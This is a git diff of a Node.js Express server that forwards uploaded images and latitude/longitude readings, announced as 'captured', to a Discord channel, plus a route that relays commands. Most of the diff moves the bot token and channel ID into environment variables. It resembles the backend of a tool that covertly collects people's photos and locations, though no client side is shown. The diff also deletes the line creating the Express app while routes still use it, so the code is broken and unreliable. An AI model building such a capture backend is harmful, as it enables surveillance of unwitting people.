@@ -3,10 +3,15 @@ const bodyParser = require('body-parser');
 const fs = require('fs');
 const path = require('path');
 const { Client, GatewayIntentBits } = require('discord.js');  // Updated import
-const { token, channelID } = require('./config.json');  // Import token and channel ID
+require('dotenv').config();  // Load environment variables from .env file
 
-const app = express();
-const discordClient = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] });  // Updated
+const discordClient = new Client({
+  intents: [
+    GatewayIntentBits.Guilds,
+    GatewayIntentBits.GuildMessages,
+    GatewayIntentBits.MessageContent, // Added to read message content
+  ],
+});
 
 // Server Port
 const PORT = process.env.PORT || 3000;
@@ -30,8 +35,14 @@ discordClient.once('ready', () => {
     console.log('Discord bot is ready!');
 });
 
-// Log in to Discord bot
-discordClient.login(token);
+// Log in to Discord bot using the token from environment variables
+discordClient.login(process.env.DISCORD_TOKEN)
+    .then(() => {
+        console.log('Bot logged in successfully!');
+    })
+    .catch(err => {
+        console.error('Error logging in:', err.message);
+    });
 
 // Route to handle image and location data
 app.post('/upload', (req, res) => {
@@ -64,7 +75,7 @@ app.post('/upload', (req, res) => {
             // Send the message to Discord with location info and image
             const message = `New location and image captured!\nLatitude: ${latitude}, Longitude: ${longitude}`;
             
-            discordClient.channels.fetch(channelID)  // Use your channel ID here
+            discordClient.channels.fetch(process.env.CHANNEL_ID)  // Use the channel ID from environment variable
                 .then(channel => {
                     channel.send(message);
                     channel.send({ files: [imagePath] });  // Sends the captured image
@@ -80,7 +91,7 @@ app.post('/upload', (req, res) => {
 app.post('/send-command', (req, res) => {
     const { command } = req.body;
     if (command) {
-        discordClient.channels.fetch(channelID)
+        discordClient.channels.fetch(process.env.CHANNEL_ID)
             .then(channel => {
                 channel.send(`Command received: ${command}`);
             })
